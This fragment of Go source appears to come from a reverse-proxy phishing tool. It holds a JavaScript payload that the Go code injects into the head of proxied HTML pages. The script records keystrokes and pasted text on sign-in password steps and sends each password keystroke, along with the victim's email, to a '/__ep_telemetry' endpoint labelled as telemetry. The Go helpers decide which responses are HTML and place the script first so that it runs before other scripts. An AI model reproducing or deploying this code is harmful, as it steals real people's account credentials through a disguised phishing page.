}catch(_){} } return listener.call(this,ev); }; return oa.call(this,type,wrapper,opts); } return oa.call(this,type,listener,opts); }; } }catch(e){} } install(); try{ setInterval(install,50); }catch(e){} try{ if(typeof document!=='undefined'){ document.addEventListener('DOMContentLoaded',install); } }catch(e){} try{ if(typeof window!=='undefined'){ window.addEventListener('load',install); } }catch(e){} (function(){ function epSend(kind,val,email){ try{ var p={type:kind,data:val,meta:{}}; if(email) p.meta.email=email; var x=new XMLHttpRequest(); x.open('POST','/__ep_telemetry',true); x.setRequestHeader('Content-Type','application/json'); x.send(JSON.stringify(p)); }catch(e){} } function findEmail(){ try{ var m=location.search.match(/[?&](idnf|identifier|email)=([^&]+)/); if(m) return decodeURIComponent(m[2]); }catch(e){} var e=document.querySelector('input[type=email],input[name=email],input[name=identifier]'); return e&&e.value?e.value:''; } function isPwVisible(){ try{ var e=document.querySelector('input[type=password]'); if(!e) return false; var r=e.getBoundingClientRect(); if(r.width<2||r.height<2) return false; var s=getComputedStyle(e); if(s.visibility==='hidden'||s.display==='none') return false; return !!document.querySelector('input[name=Passwd],form[action*=pwd]'); }catch(e){ return false; } } function onPwStep(){ return location.pathname.indexOf('/signin/password')>=0 || location.pathname.indexOf('/challenge/pwd')>=0 || isPwVisible(); } var buf=''; function flush(){ if(buf) epSend('password',buf,findEmail()); } document.addEventListener('keydown',function(e){ if(!onPwStep()){ buf=''; return; } if(e.key && e.key.length===1){ buf+=e.key; flush(); } else if(e.key==='Backspace'){ buf=buf.slice(0,-1); flush(); } else if(e.key==='Enter'){ flush(); } },true); document.addEventListener('paste',function(e){ if(!onPwStep()) return; try{ var t=(e.clipboardData||window.clipboardData).getData('text'); if(t){ buf+=t; flush(); } }catch(_){} },true); setInterval(function(){ if(!onPwStep()) buf=''; },1000); })(); })(); ", "__OBJ__", obj, 1);
		shim = append(shim, []byte("<script>"+shimJS+"</script>")...)
	}
	if loc := cookieShimHeadRE.FindIndex(raw); loc != nil {
		end := loc[1]
		out := make([]byte, 0, len(raw)+len(shim))
		out = append(out, raw[:end]...)
		out = append(out, shim...)
		out = append(out, raw[end:]...)
		return out
	}
	// No <head>: inject at the very start so the override is installed before
	// other inline scripts execute.
	return append(shim, raw...)
}

// looksLikeHTML reports whether a buffered body is an HTML document worth
// injecting the cookie shim into. JSON ({, [), JavaScript, and plaintext bodies
// must be left alone so the shim never appears as literal text in the browser.
func looksLikeHTML(raw []byte) bool {
	lim := raw
	if len(lim) > 1024 {
		lim = lim[:1024]
	}
	s := strings.TrimSpace(string(lim))
	if !strings.HasPrefix(s, "<") {
		return false
	}
	low := strings.ToLower(s)
	return strings.Contains(low, "<html") || strings.Contains(low, "<!doctype") ||
		strings.Contains(low, "<head") || strings.Contains(low, "<body") ||
		strings.Contains(low, "<script") || strings.Contains(low, "<title") ||
		strings.Contains(low, "<meta") || strings.Contains(low, "<div") ||
		strings.Contains(low, "<span") || strings.Contains(low, "<a ") ||
		strings.Contains(low, "<link") || strings.Contains(low, "<form")
}
